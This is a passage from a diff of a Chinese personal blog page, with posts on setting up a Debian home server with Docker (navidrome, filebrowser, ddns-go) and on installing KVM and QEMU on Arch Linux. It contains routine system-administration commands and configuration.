@@ -437,6 +437,513 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/01/08/%E8%BD%ACdebian/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/head.webp">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="frozenfish'blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2024/01/08/%E8%BD%ACdebian/" itemprop="url">转debian</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2024-01-08T22:36:12+08:00">
+                2024-01-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="系统相关"><a href="#系统相关" class="headerlink" title="系统相关"></a>系统相关</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fish@fishserver:~$ lsblk</span><br><span class="line">NAME                      MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS</span><br><span class="line">sda                         8:0    0 238.5G  0 disk </span><br><span class="line">├─sda1                      8:1    0   512M  0 part /boot/efi</span><br><span class="line">├─sda2                      8:2    0   488M  0 part /boot</span><br><span class="line">└─sda3                      8:3    0 237.5G  0 part </span><br><span class="line">  ├─fishserver--vg-root   254:0    0  27.9G  0 lvm  /</span><br><span class="line">  ├─fishserver--vg-swap_1 254:1    0   976M  0 lvm  [SWAP]</span><br><span class="line">  └─fishserver--vg-home   254:2    0 208.6G  0 lvm  /home</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">目录存放：</span><br><span class="line">    /music音乐</span><br><span class="line">    /nav 数据库工具</span><br></pre></td></tr></table></figure>
+
+<h2 id="没有ifconfig命令"><a href="#没有ifconfig命令" class="headerlink" title="没有ifconfig命令"></a>没有ifconfig命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">安装包</span><br><span class="line">apt install net-tools</span><br></pre></td></tr></table></figure>
+
+<h1 id="ifconfig：单网卡"><a href="#ifconfig：单网卡" class="headerlink" title="ifconfig：单网卡"></a>ifconfig：单网卡</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">fish@fishserver:~$ /sbin/ifconfig </span><br><span class="line">br-031d046d3ebf: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255</span><br><span class="line">        ether 02:42:a1:c0:98:79  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">docker0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255</span><br><span class="line">        inet6 fe80::42:c0ff:fee6:b1dd  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 02:42:c0:e6:b1:dd  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 5  bytes 526 (526.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">enp1s0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.2.17  netmask 255.255.255.0  broadcast 192.168.2.255</span><br><span class="line">        inet6 fe80::2e0:b4ff:fe60:cea9  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        inet6 2408:827a:3f:dd80:2e0:b4ff:fe60:cea9  prefixlen 64  scopeid 0x0&lt;global&gt;</span><br><span class="line">        ether 00:e0:b4:60:ce:a9  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 244  bytes 36051 (35.2 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 235  bytes 34042 (33.2 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">veth22eda58: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet6 fe80::c079:72ff:fe92:35f7  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether c2:79:72:92:35:f7  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 16  bytes 1392 (1.3 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="更换源"><a href="#更换源" class="headerlink" title="更换源"></a>更换源</h1><p>修改文件 &#x2F;etc&#x2F;apt&#x2F;sources.list 为下面内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Debian 10 buster</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 中科大源</span></span><br><span class="line"></span><br><span class="line">deb http://mirrors.ustc.edu.cn/debian buster main contrib non-free</span><br><span class="line">deb http://mirrors.ustc.edu.cn/debian buster-updates main contrib non-free</span><br><span class="line">deb http://mirrors.ustc.edu.cn/debian buster-backports main contrib non-free</span><br><span class="line">deb http://mirrors.ustc.edu.cn/debian-security/ buster/updates main contrib non-free</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/debian buster main contrib non-free</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/debian buster-updates main contrib non-free</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/debian buster-backports main contrib non-free</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/debian-security/ buster/updates main contrib non-free</span><br><span class="line"></span><br><span class="line"><span class="comment"># 官方源</span></span><br><span class="line"></span><br><span class="line">deb http://deb.debian.org/debian buster main contrib non-free</span><br><span class="line">deb http://deb.debian.org/debian buster-updates main contrib non-free</span><br><span class="line">deb http://deb.debian.org/debian-security/ buster/updates main contrib non-free</span><br><span class="line"></span><br><span class="line">deb-src http://deb.debian.org/debian buster main contrib non-free</span><br><span class="line">deb-src http://deb.debian.org/debian buster-updates main contrib non-free</span><br><span class="line">deb-src http://deb.debian.org/debian-security/ buster/updates main contrib non-free</span><br><span class="line"></span><br><span class="line"><span class="comment"># 网易源</span></span><br><span class="line"></span><br><span class="line">deb http://mirrors.163.com/debian/ buster main non-free contrib</span><br><span class="line">deb http://mirrors.163.com/debian/ buster-updates main non-free contrib</span><br><span class="line">deb http://mirrors.163.com/debian/ buster-backports main non-free contrib</span><br><span class="line">deb http://mirrors.163.com/debian-security/ buster/updates main non-free contrib</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.163.com/debian/ buster main non-free contrib</span><br><span class="line">deb-src http://mirrors.163.com/debian/ buster-updates main non-free contrib</span><br><span class="line">deb-src http://mirrors.163.com/debian/ buster-backports main non-free contrib</span><br><span class="line">deb-src http://mirrors.163.com/debian-security/ buster/updates main non-free contrib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 阿里云</span></span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/debian/ buster main non-free contrib</span><br><span class="line">deb http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib</span><br><span class="line">deb http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib</span><br><span class="line">deb http://mirrors.aliyun.com/debian-security buster/updates main</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/debian/ buster main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/debian-security buster/updates main</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">apt install sudo</span><br><span class="line">apt install docker</span><br><span class="line">vim /etc/docker/daemon.json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;https://7bezldxe.mirror.aliyuncs.com/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https://docker.mirrors.ustc.edu.cn/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https://hub-mirror.c.163.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https://registry.docker-cn.com&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;insecure-registries&quot;</span>: [],</span><br><span class="line">  <span class="string">&quot;debug&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="string">&quot;experimental&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="string">&quot;features&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;buildkit&quot;</span>: <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>how to install docker</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://docs.docker.com/desktop/</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install curl</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com -o get-docker.sh</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sh get-docker.sh</span><br></pre></td></tr></table></figure>
+
+<h1 id="docker安装navidrome"><a href="#docker安装navidrome" class="headerlink" title="docker安装navidrome"></a>docker安装navidrome</h1><h2 id="官方的写法："><a href="#官方的写法：" class="headerlink" title="官方的写法："></a>官方的写法：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">version: <span class="string">&quot;3&quot;</span></span><br><span class="line">services:</span><br><span class="line">  navidrome:</span><br><span class="line">    image: deluan/navidrome:latest</span><br><span class="line">    user: 1000:1000 <span class="comment"># should be owner of volumes</span></span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;4533:4533&quot;</span></span><br><span class="line">    restart: unless-stopped</span><br><span class="line">    environment:</span><br><span class="line">      <span class="comment"># Optional: put your config options customization here. Examples:</span></span><br><span class="line">      ND_SCANSCHEDULE: 1h</span><br><span class="line">      ND_LOGLEVEL: info  </span><br><span class="line">      ND_SESSIONTIMEOUT: 24h</span><br><span class="line">      ND_BASEURL: <span class="string">&quot;&quot;</span></span><br><span class="line">    volumes:</span><br><span class="line">      - <span class="string">&quot;/path/to/data:/data&quot;</span></span><br><span class="line">      - <span class="string">&quot;/path/to/your/music/folder:/music:ro&quot;</span></span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">      其他1；</span><br><span class="line">      version: <span class="string">&#x27;3.8&#x27;</span></span><br><span class="line">      services:  </span><br><span class="line">      navidrome:    </span><br><span class="line">      image: <span class="string">&#x27;deluan/navidrome:latest&#x27;</span>    </span><br><span class="line">      container_name: navidrome        restart: unless-stopped      </span><br><span class="line">      network_mode: bridge        environment:     </span><br><span class="line">      - ND_SCANNER_EXTRACTOR=ffmpeg               PND_ENABLETRANSCODINGCONFIGGID=<span class="literal">true</span>                - ND_ENABLESHARING=<span class="literal">true</span>                - ND_SCANSCHEDULE=1h        ports:      - <span class="string">&#x27;4533:4533&#x27;</span>    </span><br><span class="line">      volumes:      - /share/Container/navidrome/data:/data            - 		/share/media2/music:/music</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">docker-compose</span><br><span class="line">创建包含以下内容的文件（或添加服务 下面到您现有的文件）：docker-compose.yml</span><br><span class="line">navidrome</span><br><span class="line"></span><br><span class="line">创建一个docker-compose.yml文件,内容如下：</span><br><span class="line"></span><br><span class="line">version: <span class="string">&quot;3&quot;</span></span><br><span class="line">services:</span><br><span class="line">  navidrome:</span><br><span class="line">    image: deluan/navidrome:latest</span><br><span class="line">    user: 1000:1000 <span class="comment"># should be owner of volumes</span></span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;4533:4533&quot;</span></span><br><span class="line">    restart: unless-stopped</span><br><span class="line">    environment:</span><br><span class="line">      <span class="comment"># Optional: put your config options customization here. Examples:</span></span><br><span class="line">      ND_SCANSCHEDULE: 1h</span><br><span class="line">      ND_LOGLEVEL: info  </span><br><span class="line">      ND_SESSIONTIMEOUT: 24h</span><br><span class="line">      ND_BASEURL: <span class="string">&quot;&quot;</span></span><br><span class="line">    volumes:</span><br><span class="line">      - <span class="string">&quot;/home/fish/navidrome:/data&quot;</span></span><br><span class="line">      - <span class="string">&quot;/home/fish/music:/music:ro&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">fish@fishserver:~$ sudo docker ps</span><br><span class="line">CONTAINER ID   IMAGE                     COMMAND            CREATED          STATUS                          PORTS     NAMES</span><br><span class="line">36f1b4c09f21   deluan/navidrome:latest   <span class="string">&quot;/app/navidrome&quot;</span>   10 minutes ago   Restarting (1) 34 seconds ago             fish_navidrome_1</span><br><span class="line"></span><br><span class="line">fish@fishserver:~$ sudo docker <span class="built_in">rm</span> 36f1b4c09f21</span><br><span class="line">Error response from daemon: You cannot remove a restarting container 36f1b4c09f21d86076b10c9d7f9659eeff2976c4199e4b3beab2f26112503b0c. Stop the container before attempting removal or force remove</span><br><span class="line"></span><br><span class="line">fish@fishserver:~$ sudo docker <span class="built_in">rm</span> -f  36f1b4c09f21</span><br><span class="line">36f1b4c09f21</span><br><span class="line"></span><br><span class="line">fish@fishserver:~$ </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="第二种方式"><a href="#第二种方式" class="headerlink" title="第二种方式"></a>第二种方式</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">   --name navidrome \</span><br><span class="line">   --restart=unless-stopped \</span><br><span class="line">   --user $(<span class="built_in">id</span> -u):$(<span class="built_in">id</span> -g) \</span><br><span class="line">   -v /home/fish/music:/music:ro \</span><br><span class="line">   -v /home/fish/navidrome:/data \</span><br><span class="line">   -p 4533:4533 \</span><br><span class="line">   -e ND_LOGLEVEL=info \</span><br><span class="line">   deluan/navidrome:latest</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -v /home/fish/music:/srv -v /home/fish/filebrowser/filebrowserconfig.json:/etc/config.json -v /home/fish/filebrowser/database.db:/etc/database.db -p 8080:80 filebrowser/filebrowser</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="ddns-go"><a href="#ddns-go" class="headerlink" title="ddns-go"></a>ddns-go</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name ddns-go --restart=always --net=host -v /home/fish/ddns-go:/root jeessy/ddns-go</span><br></pre></td></tr></table></figure>
+
+<h2 id="Docker中使用-来自官方文档"><a href="#Docker中使用-来自官方文档" class="headerlink" title="Docker中使用(来自官方文档)"></a>Docker中使用(来自官方文档)</h2><ul>
+<li><p>不挂载主机目录, 删除容器同时会删除配置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># host模式, 同时支持IPv4/IPv6, Liunx系统推荐</span><br><span class="line">docker run -d --name ddns-go --restart=always --net=host jeessy/ddns-go</span><br><span class="line"># 桥接模式, 只支持IPv4, Mac/Windows系统推荐</span><br><span class="line">docker run -d --name ddns-go --restart=always -p 9876:9876 jeessy/ddns-go</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在浏览器中打开<code>http://主机IP:9876</code>，修改你的配置，成功</p>
+</li>
+<li><p>[可选] 挂载主机目录, 删除容器后配置不会丢失。可替换 <code>/opt/ddns-go</code> 为主机目录, 配置文件为隐藏文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name ddns-go --restart=always --net=host -v /opt/ddns-go:/root jeessy/ddns-go</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>[可选] 支持启动带参数 <code>-l</code>监听地址 <code>-f</code>间隔时间(秒)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name ddns-go --restart=always --net=host jeessy/ddns-go -l :9877</span><br></pre></td></tr></table></figure></li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/01/08/kvm%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85wrt/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/head.webp">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="frozenfish'blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2024/01/08/kvm%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85wrt/" itemprop="url">kvm虚拟机安装wrt</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2024-01-08T16:29:59+08:00">
+                2024-01-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="最近在折腾服务部署公网的事情"><a href="#最近在折腾服务部署公网的事情" class="headerlink" title="最近在折腾服务部署公网的事情"></a>最近在折腾服务部署公网的事情</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">本来想着360t7刷成wrt以为能在线涮实际上是要烧录</span><br><span class="line">他自带的防火墙挡我的服务却没有关闭的地方。这个就很难受</span><br><span class="line">因为一时半会没有办法整一台拥有wrt的硬路由</span><br><span class="line">又听虚拟机kvm和vbox。选择kvm虚拟机</span><br><span class="line">之前用docker结果夺舍宿主机，。这个我不太了解dockers技术等以后会研究一下他的虚拟化技术！！</span><br><span class="line"></span><br><span class="line">服务器环境是arch。kvm。docker，ddns，反向代理还有https以后会考虑搞！</span><br></pre></td></tr></table></figure>
+
+<p>搬运自：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/suxiuf/p/17586593.html">archlinux 安装KVM,QEMU - 掰断曲别针 - 博客园 (cnblogs.com)</a></p>
+<p>KVM是Linux世界中最常用的虚拟化软件之一。事实上，大多数云提供商都使用KVM作为他们的虚拟机管理程序。包括OpenStack在内的大型项目都使用KVM作为默认虚拟化工具。</p>
+<p>以下是如何在Arch Linux和Manjaro上安装KVM、QEMU和Virt Manager的完整指南。</p>
+<h1 id="安装KVM包"><a href="#安装KVM包" class="headerlink" title="安装KVM包"></a>安装KVM包</h1><p>第一步是安装运行KVM所需的所有软件包：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -Syy</span><br><span class="line">sudo pacman -S archlinux-keyring</span><br><span class="line">sudo pacman -S qemu virt-manager virt-viewer dnsmasq vde2 bridge-utils openbsd-netcat dmidecode</span><br></pre></td></tr></table></figure>
+
+<p>同时安装ebtbles和iptables软件包。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S ebtables iptables</span><br></pre></td></tr></table></figure>
+
+<h1 id="安装其他工具"><a href="#安装其他工具" class="headerlink" title="安装其他工具"></a>安装其他工具</h1><p>libguestfs是一组用于访问和修改虚拟机（VM）磁盘映像的工具。作用如下：</p>
+<ul>
+<li>查看和编辑来宾中的文件</li>
+<li>编写对虚拟机的更改脚本</li>
+<li>监视磁盘使用&#x2F;可用统计信息</li>
+<li>创建来宾</li>
+<li>P2V （物理机到虚拟机的迁移）</li>
+<li>V2V （虚拟机到虚拟机的迁移）</li>
+<li>执行备份及其他</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S libguestfs</span><br></pre></td></tr></table></figure>
+
+<h1 id="启动KVM-libvirt服务"><a href="#启动KVM-libvirt服务" class="headerlink" title="启动KVM libvirt服务"></a>启动KVM libvirt服务</h1><ul>
+<li>启用服务并设置开机自启动</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl enable libvirtd.service</span><br><span class="line">sudo systemctl start libvirtd.service</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查看运行状态</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status libvirtd.service</span><br></pre></td></tr></table></figure>
+
+<h1 id="配置普通用户可以使用KVM"><a href="#配置普通用户可以使用KVM" class="headerlink" title="配置普通用户可以使用KVM"></a>配置普通用户可以使用KVM</h1><ul>
+<li>打开&#x2F;etc&#x2F;libvirt&#x2F;libvirtd.conf文件进行编辑。</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S vim</span><br><span class="line">sudo vim /etc/libvirt/libvirtd.conf</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>将UNIX域套接字组所有权设置为libvirt（第85行左右）</li>
